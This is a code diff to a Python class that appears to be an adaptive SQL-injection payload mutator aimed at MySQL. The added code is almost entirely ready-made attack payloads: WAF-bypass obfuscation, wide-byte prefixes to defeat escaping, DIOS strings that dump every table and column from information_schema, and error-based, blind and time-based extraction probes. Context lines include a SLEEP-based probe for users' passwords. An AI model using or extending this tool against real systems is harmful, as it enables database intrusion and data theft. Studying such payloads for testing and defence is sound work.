@@ -25,13 +25,19 @@ class ASTMutator:
             "dynamic_structural": self._dynamic_structural_mutation,
             "upgrade_to_exfil": self._upgrade_to_exfil,
             "semantic_mutation": self._semantic_symbol_mutation,
-            "grammar_expansion": self._grammar_expansion
+            "grammar_expansion": self._grammar_expansion,
+            "scientific_notation": self._scientific_notation_bypass,
+            "wide_byte": self._wide_byte_injection,
+            "dios_mutation": self._dios_mutation,
+            "advanced_blind": self._advanced_blind_probing,
+            "advanced_time": self._advanced_time_probing
         }
         # Awareness: Track success of each strategy (Q-values)
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
-        # Priority Boost: Union and Column Discovery (Strategic User Request)
-        self.strategy_weights["union_balance"] = 5.0
-        self.strategy_weights["column_discovery"] = 5.0
+        # Priority Boost: MySQL Specific Methods
+        self.strategy_weights["dios_mutation"] = 3.0
+        self.strategy_weights["scientific_notation"] = 3.0
+        self.strategy_weights["wide_byte"] = 2.0
         
         # Gene Credit Assignment: Track reputation of each keyword
         self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
@@ -147,32 +153,51 @@ class ASTMutator:
         return self.grammar.obfuscate_query(payload, intensity=2)
 
     def _apply_error_feedback(self, payload, error):
-        """Applies specific mutations based on SQL error messages."""
+        """Applies specific mutations based on MySQL error messages from reference."""
         error_lower = error.lower()
-        # Column count mismatch
+        
+        # 1. Column count mismatch (Union Based)
         if "column" in error_lower and ("count" in error_lower or "match" in error_lower):
+            # Method: Iterative NULL / ORDER BY Feedback
+            if "ORDER BY" in payload.upper() or "GROUP BY" in payload.upper():
+                # If we hit an error with ORDER BY 5, we know it's 4.
+                match = re.search(r"unknown column '(\d+)' in 'order clause'", error_lower)
+                if match:
+                    found_cols = int(match.group(1)) - 1
+                    return f" UNION SELECT {','.join(['NULL']*found_cols)}"
+            
+            # Method: LIMIT INTO Method
+            if "LIMIT" in payload.upper() and ("different number" in error_lower):
+                parts = payload.split("INTO")
+                if len(parts) > 1:
+                    # Add another placeholder @
+                    return f"{parts[0]} INTO {parts[1].strip()},@"
+
             if "UNION SELECT" in payload.upper():
-                # Add more columns to UNION
+                # Standard Balance
                 parts = re.split(r"(SELECT\s+)", payload, flags=re.IGNORECASE)
                 if len(parts) >= 3:
                     cols = parts[2].split(",")
                     cols.append("NULL")
                     return f"{parts[0]}{parts[1]}{','.join(cols)}"
         
-        # Unknown Column (caused by unquoted strings like admin parsed as column)
+        # 2. Error-Based Upgrade: If any standard error is detected, attempt GTID_SUBSET or UPDATEXML
+        if "syntax" in error_lower or "error" in error_lower:
+            techniques = [
+                f" AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337)",
+                f" AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337)",
+                f" AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~'))",
+                f" AND (SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))"
+            ]
+            clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+            return clean_payload + random.choice(techniques)
+
+        # 3. Unknown Column Logic
         unknown_match = re.search(r"unknown column '([^']+)'", error_lower)
         if unknown_match:
             problem_token = unknown_match.group(1)
-            # Replace the specific incorrectly parsed unquoted string with a numeric '1'
             return re.sub(rf'\b{re.escape(problem_token)}\b', "1", payload, flags=re.IGNORECASE)
 
-        # Quote mismatch or syntax error near quote
-        if "syntax" in error_lower and ("'" in error_lower or '"' in error_lower):
-            if "'" in payload and not payload.endswith("-- -"): 
-                return payload + "-- -"
-            if '"' in payload and not payload.endswith("#"):
-                return payload + "#"
-            
         return payload
 
     def _upgrade_to_exfil(self, payload):
@@ -221,6 +246,59 @@ class ASTMutator:
             " AND (SELECT IF(SUBSTR(password,1,1)=0x61,SLEEP(5),1) FROM users WHERE user=0x61646d696e)"
         ]
         return clean_payload + random.choice(targets)
+
+    def _scientific_notation_bypass(self, payload):
+        """WAF Bypass: Uses MySQL Scientific Notation (e-notation) to obfuscate."""
+        # Replace 1=1 or similar with 1.e('')=
+        mutated = payload
+        mutated = re.sub(r"(\w+)\s*=\s*\1", r"1.e('')=", mutated)
+        # Obfuscate keywords using the scientific notation rule from grammar
+        for kw in ["SELECT", "UNION", "FROM", "WHERE"]:
+            if kw in mutated.upper():
+                mutated = re.sub(rf'\b{kw}\b', f"1.e({kw})", mutated, flags=re.IGNORECASE)
+        return mutated
+
+    def _wide_byte_injection(self, payload):
+        """MySQL Wide Byte Injection (GBK): Uses %bf%27 to break escaping."""
+        # We simulate the wide-byte prefix by appending it to the start of the payload
+        # This is particularly effective if the backend uses addslashes or mysql_real_escape_string with GBK
+        prefixes = ["%bf%27", "%df%27", "%8c%a8%27", "%a1%27"]
+        return random.choice(prefixes) + " OR 1=1"
+
+    def _dios_mutation(self, payload):
+        """DIOS (Dump In One Shot): Advanced technique for massive data extraction."""
+        dios_patterns = [
+            "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)",
+            "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
+            "(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)"
+        ]
+        # Truncate and replace current query with DIOS pattern
+        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        if "UNION" in clean_payload.upper():
+             # Append to existing union
+             return clean_payload + "," + random.choice(dios_patterns)
+        return clean_payload + " UNION SELECT " + random.choice(dios_patterns)
+
+    def _advanced_blind_probing(self, payload):
+        """Advanced Blind SQLi using MAKE_SET, LIKE, and REGEXP from reference."""
+        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        techniques = [
+            " AND MAKE_SET(1<(SELECT(length(database()))),1)",
+            " AND (SELECT username FROM users WHERE username REGEXP '^.{8,}$')",
+            " AND products.product_name LIKE '%a%'",
+            " AND (SELECT ASCII(SUBSTR(DATABASE(),1,1))) > 64"
+        ]
+        return clean_payload + random.choice(techniques)
+
+    def _advanced_time_probing(self, payload):
+        """Advanced Time-Based SQLi using BENCHMARK and nested SLEEP."""
+        clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
+        techniques = [
+            " AND BENCHMARK(40000000,SHA1(1337))",
+            " AND (SELECT 1337 FROM (SELECT(SLEEP(5))) RANDSTR)",
+            " XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR"
+        ]
+        return clean_payload + random.choice(techniques)
 
     def _context_aware_wrap(self, payload):
         """Wraps payload based on detected context (quotes, brackets).
@@ -485,10 +563,10 @@ class ASTMutator:
 
     def _logical_equivalents(self, payload):
         equivalents = {
-            r"1=1": ["true", "not false", "~0", "0<=>0", "1<=>1", "0x31<=>0x31", "(SELECT 1)<=>1", "8=8"],
-            r"1=2": ["false", "not true", "1<=>0", "0<=>1", "(SELECT 1)<=>0"],
-            r"\bOR\b": ["||", "XOR", "OR 1<=>1", "OR true"],
-            r"\bAND\b": ["&&", "AND 1<=>1"],
+            r"1=1": ["true", "not false", "~0", "0<=>0", "1<=>1", "0x31<=>0x31", "(SELECT 1)<=>1", "8=8", "1*56=56"],
+            r"1=2": ["false", "not true", "1<=>0", "0<=>1", "(SELECT 1)<=>0", "1-true=0"],
+            r"\bOR\b": ["||", "XOR", "OR 1<=>1", "OR true", "OR (SELECT 1)"],
+            r"\bAND\b": ["&&", "AND 1<=>1", "AND (SELECT 1)"],
             r"\bXOR\b": ["OR", "||", "XOR true", "XOR 1<=>1"],
             r"\btrue\b": ["1<=>1", "not 0", "XOR false", "(SELECT 1)"],
             r"\bfalse\b": ["1<=>2", "0", "NULL", "(SELECT 0)"]
